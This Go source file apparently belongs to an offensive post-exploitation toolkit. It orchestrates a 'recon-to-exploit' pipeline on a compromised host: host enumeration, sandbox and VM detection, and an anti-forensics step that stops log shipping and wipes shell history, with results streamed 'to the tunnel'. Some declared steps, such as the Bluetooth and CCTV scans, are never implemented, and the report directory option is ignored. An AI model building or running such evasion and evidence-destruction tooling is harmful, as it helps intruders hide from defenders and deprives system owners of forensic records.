package recon2

import (
	"errors"
	"fmt"
	"strings"
	"time"
)

// Workflow orchestration. Chained actions that fire the primitives in order
// and collect their outputs — the operator-side reducer that runs the
// standard recon-to-exploit pipeline.
//
// Each step is optional and gated on a `StepOptions` flag. The reducer
// returns one WorkflowResult per step so the caller can render progress or
// stream the whole thing to the tunnel.

// WorkflowStep names one stage of the pipeline.
type WorkflowStep string

const (
	StepHostInfo   WorkflowStep = "hostinfo"
	StepVMDetect   WorkflowStep = "vmdetect"
	StepAntiforen  WorkflowStep = "antiforen"
	StepGeoIP      WorkflowStep = "geoip"
	StepBTScan     WorkflowStep = "bluetooth_scan"
	StepBTServices WorkflowStep = "bluetooth_gatt"
	StepCCTVScan   WorkflowStep = "cctv_scan"
	StepCSInt      WorkflowStep = "csint_index"
	StepReport     WorkflowStep = "report"
)

// WorkflowOptions controls the pipeline.
type WorkflowOptions struct {
	// Which steps to run. Empty = default set.
	Steps []WorkflowStep

	// Per-step configuration
	CSIntRoot      string
	ReportTitle    string
	ReportOperator string
	ReportDir      string
	DryRun         bool
}

// WorkflowResult is one step's outcome.
type WorkflowResult struct {
	Step    WorkflowStep
	OK      bool
	Summary string
	Error   string
	Elapsed time.Duration
}

// DefaultWorkflowSteps is the standard pipeline.
var DefaultWorkflowSteps = []WorkflowStep{
	StepHostInfo,
	StepVMDetect,
	StepGeoIP,
}

// RunWorkflow executes the pipeline. Each step's primitive is called and
// the result is appended to the returned slice.
//
// The steps are best-effort — a failing step logs an error and the
// pipeline continues. The workflow returns the full result set.
//
// Per-step configuration lives on WorkflowOptions. Inputs that step needs
// but don't have a default fall back to skip-with-note.
func RunWorkflow(opts WorkflowOptions) []WorkflowResult {
	steps := opts.Steps
	if len(steps) == 0 {
		steps = DefaultWorkflowSteps
	}

	// collection accumulates JSON sources as the workflow runs. The final
	// StepReport consumes it.
	collector := NewReport(opts.ReportTitle, opts.ReportOperator, "")
	var collectedDir string

	var results []WorkflowResult
	for _, s := range steps {
		start := time.Now()
		r := WorkflowResult{Step: s}
		switch s {
		case StepHostInfo:
			if opts.DryRun {
				r.Summary = "would enumerate interfaces, addresses, routes, DNS"
				r.OK = true
				break
			}
			h, err := Grab()
			if err != nil {
				r.Error = err.Error()
			} else {
				blob, _ := h.MarshalJSONBlob()
				collector.Raw["hostinfo"] = blob
				r.Summary = fmt.Sprintf("host=%s ifaces=%d dns=%d", h.Hostname, len(h.Interfaces), len(h.DNSServers))
				r.OK = true
			}

		case StepVMDetect:
			if opts.DryRun {
				r.Summary = "would scan for hypervisor / sandbox signals"
				r.OK = true
				break
			}
			signals := VMDetect()
			positives := 0
			for _, s := range signals {
				if s.Positive {
					positives++
				}
			}
			r.Summary = fmt.Sprintf("%d signals, %d positive", len(signals), positives)
			r.OK = true

		case StepAntiforen:
			if opts.DryRun {
				r.Summary = "would stop log shipping + wipe history"
				r.OK = true
				break
			}
			res := LogShippingStop(ForensicsOptions{DryRun: opts.DryRun})
			hist := HistoryWipe(ForensicsOptions{DryRun: opts.DryRun})
			r.Summary = fmt.Sprintf("logstop=%d history=%d", len(res), len(hist))
			r.OK = true

		case StepGeoIP:
			if opts.DryRun {
				r.Summary = "would classify local interface IPs"
				r.OK = true
				break
			}
			// grab local addresses and classify each
			h, err := Grab()
			if err != nil {
				r.Error = err.Error()
				break
			}
			count := 0
			for _, ifc := range h.Interfaces {
				for _, a := range ifc.Addrs {
					// strip CIDR
					ipStr := a
					if i := strings.IndexByte(ipStr, '/'); i >= 0 {
						ipStr = ipStr[:i]
					}
					if _, err := ClassifyIP(ipStr); err == nil {
						count++
					}
				}
			}
			r.Summary = fmt.Sprintf("%d addresses classified", count)
			r.OK = true

		case StepCSInt:
			if opts.DryRun || opts.CSIntRoot == "" {
				r.Summary = "would index " + opts.CSIntRoot
				r.OK = true
				break
			}
			idx, err := BuildIndex(opts.CSIntRoot, BuildIndexOptions{})
			if err != nil {
				r.Error = err.Error()
			} else {
				r.Summary = fmt.Sprintf("indexed %d docs", len(idx.Docs))
				blob, _ := idx.marshal()
				collector.Raw["csint"] = blob
				r.OK = true
			}

		case StepReport:
			if opts.DryRun {
				r.Summary = "would render report"
				r.OK = true
				break
			}
			if collectedDir == "" {
				collectedDir = "/tmp/redsky_workflow_report.md"
			}
			if err := collector.Save(collectedDir); err != nil {
				r.Error = err.Error()
			} else {
				r.Summary = "written to " + collectedDir
				r.OK = true
			}

		default:
			r.Error = "unknown step: " + string(s)
		}
		r.Elapsed = time.Since(start)
		results = append(results, r)
	}
	return results
}

// FormatWorkflow produces a Markdown-ish summary of the pipeline plan or
// results. Useful for a dry-run preview.
func FormatWorkflow(results []WorkflowResult) string {
	if len(results) == 0 {
		return "_no steps executed_"
	}
	var out string
	out += "| step | ok | summary |\n"
	out += "|---|---|---|\n"
	for _, r := range results {
		ok := "yes"
		if !r.OK {
			ok = "no"
		}
		summary := r.Summary
		if r.Error != "" {
			summary = "ERROR: " + r.Error
		}
		out += fmt.Sprintf("| %s | %s | %s |\n", r.Step, ok, summary)
	}
	return out
}

// ValidateWorkflowSteps checks that every step name in the list is known.
func ValidateWorkflowSteps(steps []WorkflowStep) error {
	known := map[WorkflowStep]bool{
		StepHostInfo: true, StepVMDetect: true, StepAntiforen: true,
		StepGeoIP: true, StepCSInt: true, StepReport: true,
	}
	for _, s := range steps {
		if !known[s] {
			return errors.New("recon2: unknown workflow step: " + string(s))
		}
	}
	return nil
}
